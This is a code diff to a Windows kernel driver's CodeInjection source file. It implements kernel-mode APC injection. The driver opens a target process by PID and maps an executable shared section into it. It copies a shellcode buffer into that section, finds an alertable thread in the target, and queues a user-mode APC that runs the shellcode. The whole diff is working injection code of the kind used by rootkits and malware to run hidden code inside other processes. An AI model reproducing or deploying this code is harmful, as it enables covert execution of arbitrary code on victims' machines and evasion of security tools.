@@ -1,4 +1,7 @@
 #include "CodeInjection.hpp"
+#pragma warning(disable : 6387)
+#pragma warning(disable : 6001)
+#define CODE_INJECTION_TAG 'edoC'
 
 
 namespace CodeInjection {
@@ -35,8 +38,8 @@ namespace CodeInjection {
 
 	SIZE_T SectionSize = 102400;
 
-	auto Injection(ULONG Pid) -> NTSTATUS {
-		__debugbreak();
+	auto Injection(_In_ ULONG Pid) -> NTSTATUS {
+		//__debugbreak();
 		if (Pid == 0)	return STATUS_INVALID_PARAMETER_1;
 
 		PEPROCESS Eprocess{};
@@ -51,84 +54,121 @@ namespace CodeInjection {
 			return ns;
 		}
 
-		KeAcquireGuardedMutex(&g_GuardedMutex);
+		//KeAcquireGuardedMutex(&g_GuardedMutex);
 		auto Kprocess = static_cast<_KPROCESS*>(Eprocess);
 		KeStackAttachProcess(Kprocess, &apc_state);
 
 		PerformInjection(Pid);
 
 		KeUnstackDetachProcess(&apc_state);
-		KeReleaseGuardedMutex(&g_GuardedMutex);
+		//KeReleaseGuardedMutex(&g_GuardedMutex);
 
 		ObDereferenceObject(Eprocess);
 		return STATUS_SUCCESS;
 	}
 
 
-	auto PerformInjection(ULONG pid) -> NTSTATUS {
+	auto PerformInjection(_In_ ULONG pid) -> NTSTATUS {
 		HANDLE SectionHandle = nullptr;
 		HANDLE RemoteProcessHandle = nullptr;
 		HANDLE CurrentProcessHandle = nullptr;
 		PVOID RemoteProcessBase = nullptr;
 		PVOID CurrentProcessBase = nullptr;
 
-		CLIENT_ID cid{};
-		cid.UniqueProcess = reinterpret_cast<HANDLE>(pid);
+		auto ns = OpenProcess(pid, &RemoteProcessHandle);
+		if (!NT_SUCCESS(ns) || RemoteProcessHandle == nullptr)		goto _exit;
+		DbgPrint("[+] Opened handle to pid(%x) : %llx\n", pid, reinterpret_cast<uintptr_t>(RemoteProcessHandle));
 
-		OBJECT_ATTRIBUTES oa{};
-		InitializeObjectAttributes(&oa, nullptr, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, nullptr, nullptr);
-
-		auto ns = ZwOpenProcess(&RemoteProcessHandle, PROCESS_ALL_ACCESS, &oa, &cid);
-		if (!NT_SUCCESS(ns)) {
-			DbgPrint("[-] ZwOpenProcess failed.\n");
-			DbgPrint("[-] Exiting with error code : %x\n", ns);
-			return ns;
-		}
-		if (RemoteProcessHandle == nullptr)		return STATUS_UNSUCCESSFUL;
-		DbgPrint("[+] Opened handle to pid(%x) : %x\n", pid, reinterpret_cast<ULONG>(RemoteProcessHandle));
-
+		
 		DbgPrint("[+] Creating Section Handle ....\n");
 		ns = CreateSection(&SectionHandle); 
-		if (!NT_SUCCESS(ns))	return ns;
-		if (SectionHandle == nullptr)	return STATUS_UNSUCCESSFUL;
+		if (!NT_SUCCESS(ns) || SectionHandle == nullptr)	goto _exit;
 
-		DbgPrint("[+] Created section with handle : %x\n", reinterpret_cast<ULONG>(SectionHandle));
+		DbgPrint("[+] Created section with handle : %llx\n", reinterpret_cast<uintptr_t>(SectionHandle));
 		DbgPrint("[+] Mapping Section to remote process image base ...\n");
 
-		ns = MapSection(SectionHandle, RemoteProcessHandle, &RemoteProcessBase);
-		if (!NT_SUCCESS(ns))	return ns;
-		if (RemoteProcessBase == nullptr)	return STATUS_UNSUCCESSFUL;
+		ns = MapSection(SectionHandle, RemoteProcessHandle, &RemoteProcessBase, true);
+		if (!NT_SUCCESS(ns) || RemoteProcessBase == nullptr)	goto _exit;
 
 		DbgPrint("[+] Mapped remote process base at 0x%llx\n", reinterpret_cast<uintptr_t>(RemoteProcessBase));
 		DbgPrint("[+] Mapping section to current process image base ...\n");
 
-		CurrentProcessHandle = PsGetCurrentProcessId();
-		ns = MapSection(SectionHandle, CurrentProcessHandle, &CurrentProcessBase);
-		if (!NT_SUCCESS(ns))	return ns;
-		if (CurrentProcessBase == nullptr)	return STATUS_UNSUCCESSFUL;
+		CurrentProcessHandle = ZwCurrentProcess();
+		ns = MapSection(SectionHandle, CurrentProcessHandle, &CurrentProcessBase, false);
+		if (!NT_SUCCESS(ns) || CurrentProcessBase == nullptr)	goto _exit;
 
 		DbgPrint("[+] Mapped current process base at 0x%llx\n", reinterpret_cast<uintptr_t>(CurrentProcessBase));
+		DbgPrint("[+] Copying shellcode to current process base ...\n");
+
+		RtlCopyMemory(CurrentProcessBase, shellcode, sizeof(shellcode));
+		//__debugbreak();
 
 		// Perform APC Injection
+		ULONG ReturnLength = 0;
 
+		ns = ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &ReturnLength);
+		if (ns != STATUS_INFO_LENGTH_MISMATCH)	goto _exit;
 
-		ZwUnmapViewOfSection(CurrentProcessHandle, CurrentProcessBase);
-		ZwUnmapViewOfSection(RemoteProcessHandle, RemoteProcessBase);
-		ZwClose(CurrentProcessHandle);
-		ZwClose(RemoteProcessHandle);
-		ZwClose(SectionHandle);
+		auto buffer = ExAllocatePoolWithTag(NonPagedPool, ReturnLength, CODE_INJECTION_TAG);
+		if (buffer == nullptr)	goto _exit;
+		DbgPrint("[+] SystemInformation : %llx\n", reinterpret_cast<uintptr_t>(buffer));
 
-		return STATUS_SUCCESS;
+		ns = ZwQuerySystemInformation(SystemProcessInformation, buffer, ReturnLength, &ReturnLength);
+		if (!NT_SUCCESS(ns)) {
+			DbgPrint("[-] ZwQuerySystemInformation failed with error code : %x.\n", ns);	
+			goto _exit;
+		}
+
+		auto SystemInformation = reinterpret_cast<SYSTEM_PROCESS_INFORMATION*>(buffer);
+
+		do {
+			//DbgPrint("\t[*] PID : %p\n", static_cast<PVOID>(SystemInformation->UniqueProcessId));
+			if (SystemInformation->UniqueProcessId == reinterpret_cast<HANDLE>(pid)) {
+				for (ULONG idx = 0; idx < SystemInformation->NumberOfThreads; idx++) {
+					auto threads = &SystemInformation->Threads[idx];
+					if (threads->State == StateWait) {
+						DbgPrint("[+] Got state wait.\n");
+						auto threadId = threads->ClientId.UniqueThread;
+						PETHREAD ThreadObject{};
+						ns = PsLookupThreadByThreadId(threadId, static_cast<PETHREAD*>(&ThreadObject));
+						if (NT_SUCCESS(ns)) {
+							DbgPrint("[+] ThreadId(%p) with Ethread : %llx\n", threadId, reinterpret_cast<uintptr_t>(ThreadObject));
+							if (ThreadObject->Alertable) {
+								ns = PerformApcInjection(ThreadObject, RemoteProcessBase);
+								if (NT_SUCCESS(ns)) {
+									ZwWaitForSingleObject(ThreadObject, TRUE, nullptr);
+									ObDereferenceObject(ThreadObject);
+									break;
+								}
+							}
+						}
+					}
+					
+				}
+			}	
+
+			SystemInformation = reinterpret_cast<SYSTEM_PROCESS_INFORMATION*>
+				((UCHAR*)SystemInformation + SystemInformation->NextEntryOffset);
+		} while (SystemInformation->NextEntryOffset != 0);
+		ExFreePoolWithTag(buffer, CODE_INJECTION_TAG);
+		
+
+	_exit:
+		if (CurrentProcessBase)		ZwUnmapViewOfSection(CurrentProcessHandle, CurrentProcessBase);
+		if (RemoteProcessBase)		ZwUnmapViewOfSection(RemoteProcessHandle, RemoteProcessBase);
+		if (CurrentProcessHandle)	ZwClose(CurrentProcessHandle);
+		if (RemoteProcessHandle)	ZwClose(RemoteProcessHandle);
+		if (SectionHandle)			ZwClose(SectionHandle);				
+
+		return ns;
 	}
 
 
-	auto CreateSection(HANDLE* hSec) -> NTSTATUS {
-		if (hSec != nullptr)	hSec = nullptr;
-		
+	auto CreateSection(_Out_ HANDLE* hSec) -> NTSTATUS {
 		LARGE_INTEGER li{};
 		li.QuadPart = SectionSize;
 		OBJECT_ATTRIBUTES oa{};
-		InitializeObjectAttributes(&oa, nullptr, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, nullptr, nullptr);
+		InitializeObjectAttributes(&oa, nullptr, OBJ_CASE_INSENSITIVE, nullptr, nullptr);
 
 		auto ns = ZwCreateSection(hSec, SECTION_ALL_ACCESS, &oa, &li, PAGE_EXECUTE_READWRITE, SEC_COMMIT, nullptr);
 		if (!NT_SUCCESS(ns))	DbgPrint("[-] ZwCreateSection failed with error code : %x\n", ns);
@@ -137,14 +177,61 @@ namespace CodeInjection {
 	}
 
 
-	auto  MapSection(HANDLE hSec, HANDLE hHandle, PVOID* base) -> NTSTATUS {
+	auto  MapSection(_In_ HANDLE hSec, _In_ HANDLE hHandle, _Out_ PVOID* base, _In_ BOOLEAN Remote) -> NTSTATUS {
+		
 		if (hSec == nullptr || hHandle == nullptr)	return STATUS_UNSUCCESSFUL;
 		if (*base != nullptr)	ZwUnmapViewOfSection(hHandle, *base);
 
-		auto ns = ZwMapViewOfSection(hSec, hHandle, base, 0, SectionSize, nullptr, &SectionSize, ViewShare,
-			MEM_RESERVE, PAGE_READWRITE);
+		LARGE_INTEGER SectionOffset{};
+		SectionOffset.QuadPart = SectionSize;
+		SIZE_T size = 0;
+
+		auto ns = ZwMapViewOfSection(hSec, hHandle, base, 0, /*SectionSize*/ 0, nullptr, /*&SectionSize*/ &size, ViewUnmap,
+			0, Remote ? PAGE_EXECUTE_READ : PAGE_READWRITE);
 		if (!NT_SUCCESS(ns))	DbgPrint("[-] ZwMapViewOfSection failed with error code : %x\n", ns);
 
 		return ns;
+	}
+
+
+	auto OpenProcess(_In_ ULONG pid, _Out_ HANDLE* hProc) -> NTSTATUS {
+		CLIENT_ID cid{};
+		cid.UniqueProcess = reinterpret_cast<HANDLE>(pid);
+
+		OBJECT_ATTRIBUTES oa{};
+		InitializeObjectAttributes(&oa, nullptr, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, nullptr, nullptr);
+
+		auto ns = ZwOpenProcess(hProc, PROCESS_ALL_ACCESS, &oa, &cid);
+		if (!NT_SUCCESS(ns))	DbgPrint("[-] ZwOpenProcess failed.\n");
+
+		return ns;
+	}
+
+
+	auto PerformApcInjection(_In_ PETHREAD Ethread, _In_ PVOID NormalRoutine) -> NTSTATUS {
+		auto apc = reinterpret_cast<KAPC*>(ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), CODE_INJECTION_TAG));
+		if (apc == nullptr)	return STATUS_INSUFFICIENT_RESOURCES;
+
+		KeInitializeApc(apc, Ethread, OriginalApcEnvironment, ApcKernelRoutine, nullptr, /*ApcNormalRoutine*/ 
+			reinterpret_cast<PKNORMAL_ROUTINE>(NormalRoutine), UserMode, nullptr);
+		if (KeInsertQueueApc(apc, nullptr, nullptr, IO_NO_INCREMENT)) {
+			DbgPrint("[+] Done with APC Injection !!!\n");
+			return STATUS_SUCCESS;
+		}
+		else {
+			DbgPrint("[+] Failed APC Injection!!!\n");
+			return STATUS_UNSUCCESSFUL;
+		}
+	}
+
+
+	auto ApcKernelRoutine(_In_ PKAPC Apc, _Inout_ PKNORMAL_ROUTINE*, _Inout_ PVOID*, _Inout_ PVOID*, _Inout_ PVOID*) -> void {
+		if (Apc)	ExFreePoolWithTag(Apc, CODE_INJECTION_TAG);
+		return;
+	}
+
+
+	auto ApcNormalRoutine(_In_ PVOID NormalContext, _In_ PVOID, _In_ PVOID) -> void {
+		UNREFERENCED_PARAMETER(NormalContext);
 	}
 }
